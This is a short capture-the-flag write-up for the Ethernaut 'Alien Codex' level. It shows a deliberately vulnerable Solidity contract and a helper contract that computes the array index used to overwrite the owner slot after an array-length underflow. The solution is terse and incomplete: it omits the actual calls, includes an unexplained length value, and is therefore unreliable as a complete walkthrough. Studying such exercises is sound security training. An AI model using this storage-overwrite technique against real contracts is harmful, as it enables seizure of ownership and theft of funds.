# Level 19 - Alien Codex

### Objective

The objective of this level is as follows:

1. You've uncovered an Alien contract. Claim ownership to complete the level.

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

### Solution

Solution inspired by [Igor Yalovoy](https://medium.com/@ylv):

```
contract Solve {

    bytes32 public one;
    uint public index;
    uint public length;
    bytes32 public lengthBytes;

    function getIndex() {
        one = keccak256(bytes32(1));
        index = 2 ** 256 - 1 - uint(one) + 1;
    }

    function getLength() {
        length = 2 ** 200 + 1;
        lengthBytes = bytes32(length);
    }
}
```

Done!
